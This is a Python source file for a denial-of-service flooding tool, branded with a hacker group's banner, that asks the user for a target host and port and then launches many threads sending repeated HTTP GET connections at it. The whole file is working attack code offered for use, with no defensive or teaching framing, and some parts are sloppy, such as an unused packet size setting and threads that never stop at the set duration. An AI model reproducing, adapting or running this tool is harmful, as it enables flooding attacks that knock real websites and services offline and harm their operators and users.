import os
import socket
import threading
import random
import time
import signal
import logging

# ======================= CONFIG =======================
TARGET = ""  # Will be set by user input
PORT = 80    # Default port
THREADS = 100  # Number of threads to use
DURATION = 60  # Duration to run the attack (in seconds)
TURBO_MODE = False  # Flag for turbo mode
PACKETS_PER_SECOND = 1000  # Packets to send per second in turbo mode
PACKET_SIZE = 1024  # Default packet size
CUSTOM_HEADERS = {}  # Custom HTTP headers

# ====================== SET UP LOGGER ========================
logging.basicConfig(filename='ddos_tool.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ====================== BANNER ========================
def show_banner():
    print("\033[31m" + r"""
██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██████╗  █████╗ ███╗   ███╗███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝
██║  ██║███████║██████╔╝█████╔╝ █████╗  ██████╔╝███████║██╔████╔██║█████╗  
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  
██████╔╝██║  ██║██║  ██║██║  ██╗██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
                          DARKFRAME CYBER ALLIANCE
                              @DCA_Lei$
    """ + "\033[0m")

# ====================== TCP FLOOD ATTACK FUNCTION ======================
def tcp_flood():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((TARGET, PORT))
                headers = b'GET / HTTP/1.1\r\nHost: ' + TARGET.encode() + b'\r\n'
                
                # Add custom headers if any
                for key, value in CUSTOM_HEADERS.items():
                    headers += f"{key}: {value}\r\n".encode()
                    
                headers += b'\r\n'
                sock.sendto(headers, (TARGET, PORT))
                
                logging.info(f"Sent packet to {TARGET}:{PORT}")
                print(f"\033[32m[+] Sent packet to {TARGET}:{PORT} of size {PACKET_SIZE}\033[0m")
                
                time.sleep(1 / PACKETS_PER_SECOND if TURBO_MODE else 0.1)  # Control sending rate
        except Exception as e:
            logging.error(f"Error: {e}")
            print(f"\033[31m[-] Error: {e}\033[0m")
            break

# ====================== CLEAR SCREEN FUNCTION ======================
def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

# ====================== SIGNAL HANDLER ======================
def signal_handler(sig, frame):
    clear_screen()
    print("\033[31m[+] Exiting DDoS Tool...\033[0m")
    os._exit(0)

# ====================== MAIN FUNCTION ======================
def main():
    global TARGET, PORT, THREADS, DURATION, TURBO_MODE, PACKET_SIZE, CUSTOM_HEADERS

    # Register signal handler for graceful exit on Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    show_banner()
    TARGET = input("\n[+] Enter target IP/domain: ").strip()
    if not TARGET:
        print("\033[31m[!] No target entered. Exiting...\033[0m")
        return

    port_input = input("[+] Enter port (default 80): ").strip()
    PORT = int(port_input) if port_input.isdigit() else 80

    threads_input = input("[+] Enter number of threads (default 100): ").strip()
    THREADS = int(threads_input) if threads_input.isdigit() else 100

    duration_input = input("[+] Enter duration in seconds (default 60): ").strip()
    DURATION = int(duration_input) if duration_input.isdigit() else 60

    turbo_input = input("[+] Enable turbo mode? (y/n): ").strip().lower()
    TURBO_MODE = turbo_input == 'y'

    packet_size_input = input("[+] Enter packet size in bytes (default 1024): ").strip()
    PACKET_SIZE = int(packet_size_input) if packet_size_input.isdigit() else PACKET_SIZE

    # Optional: Custom HTTP headers
    while True:
        header_key = input("[+] Enter custom HTTP header key (or press Enter to finish): ").strip()
        if not header_key:
            break
        header_value = input(f"[+] Enter value for '{header_key}': ").strip()
        CUSTOM_HEADERS[header_key] = header_value

    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=tcp_flood)
        threads.append(thread)
        thread.start()

    print(f"\033[34m[+] Attack will run for {DURATION} seconds...\033[0m")
    time.sleep(DURATION)

    print("\033[31m[+] Attack duration ended. Exiting...\033[0m")
    
    for thread in threads:
        thread.join()

    clear_screen()  # Clear the screen on exit
    print("\033[31m[+] Exiting DDoS Tool...\033[0m")

if __name__ == "__main__":
    main()
